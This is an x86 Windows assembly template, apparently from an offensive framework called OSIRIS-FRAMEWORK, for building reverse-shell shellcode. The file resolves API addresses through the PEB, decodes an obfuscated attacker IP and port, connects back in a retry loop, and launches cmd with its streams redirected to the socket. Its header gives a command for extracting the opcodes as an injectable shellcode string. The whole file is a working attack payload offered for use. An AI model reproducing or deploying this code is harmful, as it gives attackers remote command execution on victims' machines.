;Template: that establishes an inverse connection between the victim machine and the attacker using the PEB method
;Author: Samir sanchez garnica
;@sasaga92
;compile: using fasm (nasm file.asm)
;extract opcodes: objdump -d ./file.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
;project: OSIRIS-FRAMEWORK

format PE console
use32
 _start:
         xor eax,eax
         push eax ; null terminator for createProcA
         mov eax,[fs:eax+0x30] ; Proccess Enviroment Block
         mov eax,[eax+0xc]
         mov esi,[eax+0x14]
         lodsd
         xchg esi,eax
         lodsd
         mov ebx,[eax+0x10] ; kernel32
         mov ecx,[ebx+0x3c] ; DOS->elf_anew
         add ecx, ebx; Skip to PE start
         mov ecx, [ecx+0x78] ; offset to export table
         add ecx,ebx ; kernel32 image_export_dir
         mov esi,[ecx+0x20] ; Name Pointer Table
         add esi,ebx
         xor edx,edx
 getProcAddress:
     inc edx
     lodsd
     add eax,ebx
     cmp dword [eax],0x50746547
     jnz getProcAddress
     mov edi,0x41636f72
     cmp dword [eax+4], edi
     jnz getProcAddress
     ;---Function Adresses Chain----
     ;[esi]      GetProcAddress
     ;[esi+12]   WSAstartup
     ;[esi+16]   WSASocketA
     ;[esi+20]   connect
     ;[esi+24]   recv
     ;[esi+28]   kernel32
     ;Alphanumeric stage store:
     ;[esi+4]    CreateProcessA
     ;[esi+8]    ExitProccess
     mov esi,[ecx+0x1c] ; Functions Addresses Chain
     add esi,ebx
     add edx, 1
     mov edx,[esi+edx*4]
     add edx,ebx ; GetProcAddress
     sub esp, 32 ; Buffer for the function addresses chain
     push esp
     pop esi
     mov [esp],edx ; esi offset 0 -> GetProcAddress
     mov [esi+28],ebx ;esi offset 28 -> kernel32
    ;--------winsock2.dll Address--------------
    xor edi,edi
    push edi
    push 0x41797261 ; Ayra
    push 0x7262694c ; rbiL
    push 0x64616f4c ; daoL
    push esp
    push ebx
    call dword [esi]
    ;-----ws2_32.dll Address-------
    xor ecx,ecx
    push ecx
    mov cx, 0x3233   ; 0023
    push ecx
    push 0x5f327377  ; _2sw
    push esp
    call eax
    mov ebp,eax ;ebp = ws2_32.dll
    ;-------WSAstartup Address-------------
    xor ecx,ecx
    push ecx
    mov cx, 0x7075      ; 00up
    push ecx
    push 0x74726174     ; trat
    push 0x53415357     ; SASW
    push esp
    push ebp
    call dword [esi]
    mov [esi+12],eax ;esi offset 12 -> WSAstartup
    ;-------WSASocketA Address-------------
    xor ecx,ecx
    push ecx
    mov cx, 0x4174 ; 00At
    push ecx
    push 0x656b636f ; ekco
    push 0x53415357 ; SASW
    push esp
    push ebp
    call dword [esi]
    mov [esi+16],eax;esi offset 16 -> WSASocketA
    ;------connect Address-----------
    push edi
    mov ecx, 0x74636565 ; '\0tce'
    shr ecx, 8
    push ecx
    push 0x6e6e6f63     ; 'nnoc'
    push esp
    push ebp
    call dword [esi]
    mov [esi+20],eax;esi offset 20 -> connect
    ;------recv Address-------------
    push edi
    push 0x76636572 ;vcer
    push esp
    push ebp   
    call dword [esi]
    mov [esi+24],eax;esi offset 24 -> recv
    ;------call WSAstartup()----------
    xor ecx,ecx
    sub sp,700
    push esp
    mov cx,514
    push ecx
    call dword [esi+12]
    ;--------call WSASocket()-----------
    ; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
    ; IPPROTO_TCP = 6, NULL,
    ;(unsigned int)NULL, (unsigned int)NULL); 
    push eax ; if successful, eax = 0
    push eax
    push eax
    mov al,6
    push eax
    mov al,1
    push eax
    inc eax
    push eax   
    call dword [esi+16]
    xchg eax, edi   ; edi = SocketRefernce
    ;--------call connect----------
    ;struct sockaddr_in {
    ;   short   sin_family;
    ;   u_short sin_port;
    ;   struct  in_addr sin_addr;
    ;   char    sin_zero[8];
    ;};
    push 0x1
    pop edx
    shl edx, 24
    mov edx,0xfcff573f ;edx = _ip_address (hex)
    xor edx, 0xffffffff
    push edx
    mov edx, 0xffffa3ee
    xor edx, 0xffffffff
    push word dx ;port
    mov cx, 0x222 ;compensation bytes nulls
    sub cx,0x220  ; compensation bytes nulls
    push cx ;push 0x2
    ;int connect(
    ;_In_ SOCKET                s,
    ;_In_ const struct sockaddr *name,
    ;_In_ int                   namelen
    ;);
 loop_connect:
    mov edx,esp
    push 0x10 ; sizeof(sockaddr)
    push edx ; (sockaddr*)
    push edi ; socketReference 
    call dword [esi+20]
    xor ecx, ecx
    cmp ecx, eax
    jnz loop_connect
    ;--------call recv()----------
    ;int recv(
    ;_In_  SOCKET s,
    ;_Out_ char   *buf,
    ;_In_  int    len,
    ;_In_  int    flags
    ;);
find_createProcessA:
    ;------find CreateProcessA-------------
        xor ecx, ecx
        push ecx
        mov cx, 0x4173 ; As
        push ecx
        push 0x7365636f ; seco 
        push 0x72506574 ; rPet
        push 0x61657243 ; aerC
        push esp
        push ebx
        call dword [esi]
        mov [esi+28],eax;esi offset 24 -> CreateProcessA
find_ExitProcess:
    ;------find ExitProcessA-------------
        push edi
        mov ecx, 0x61737365 ; ssea
        push ecx
        sub dword [esp + 0x3],0x61
        push 0x636f7250 ; corP
        push 0x74697845 ; tixE
        push esp
        push ebx
        call dword [esi]
        mov [esi+32],eax;esi offset 24 -> ExitProcess
executeshell:
        ; Call CreateProcess with redirected streams
        mov edx, 0x646d6363
        shr edx, 8
        push edx
        mov ecx, esp
        xor edx, edx
        sub esp, 16
        mov ebx, esp        ; PROCESS_INFORMATION
        push edi
        push edi
        push edi
        push edx
        push edx
        xor eax, eax
        inc eax
        rol eax, 8
        inc eax
        push eax
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        push edx
        xor eax, eax
        add al, 44
        push eax
        mov eax, esp        ; STARTUP_INFO
        push ebx            ; PROCESS_INFORMATION
        push eax            ; STARTUP_INFO
        push edx
        push edx
        push edx
        xor eax, eax
        inc eax
        push eax
        push edx
        push edx
        push ecx
        push edx
        call dword [esi+28]
ExitProcess:
    call dword [esi+32]
